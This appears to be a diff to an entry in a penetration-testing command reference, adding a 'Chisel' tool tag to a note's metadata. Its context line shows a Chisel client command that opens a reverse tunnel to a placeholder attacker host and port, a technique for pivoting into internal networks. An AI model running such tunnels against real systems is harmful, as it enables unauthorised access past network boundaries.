@@ -7,6 +7,8 @@ data: ./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURC
 output: ''
 created_at: '2023-03-13T19:52:35.078857+00:00'
 updated_at: '2023-03-14T01:16:16.229550+00:00'
+tools:
+- '[[Chisel]]'
 ---
 
 # Command abe53f5a
